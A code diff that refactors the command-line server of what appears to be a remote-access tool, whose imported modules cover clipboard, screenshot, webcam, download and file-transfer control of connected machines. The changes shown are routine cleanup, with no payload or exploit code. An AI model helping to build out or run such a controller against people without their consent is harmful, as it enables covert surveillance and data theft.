@@ -1,28 +1,22 @@
 import cmd
 import logging
-import os
-import platform
 import socket
 from contextlib import suppress
 
 from cryptography import x509
-from cryptography.hazmat.primitives import padding, serialization
+from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ec
 from modules import clipboard, download, filetransfer, screenshot, webcam
 from modules.baseserver import BaseServer
+from utils import terminal
 from utils.prompts import increase_timeout_prompt
 
-if platform.system() != 'Windows':
-    # Enables using arrowkeys on unix-like systems
-    with suppress(ImportError):
-        import readline
+# Enables using arrowkeys on unix-like systems
+with suppress(ImportError):
+    import readline
 
 logging.basicConfig(level=logging.DEBUG)
 socket.setdefaulttimeout(10)
-
-# Padding for AES
-pad = padding.PKCS7(256)
-header_length = 8
 
 menu_help = """
 Commands:
@@ -130,10 +124,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
                 case 'exit':
                     break
                 case 'clear' | 'cls':
-                    if platform.system() == 'Windows':
-                        os.system('cls')
-                    else:
-                        os.system('clear')
+                    terminal.clear()
                     continue
 
             # Check if the directory is changed, in which case it should be remembered
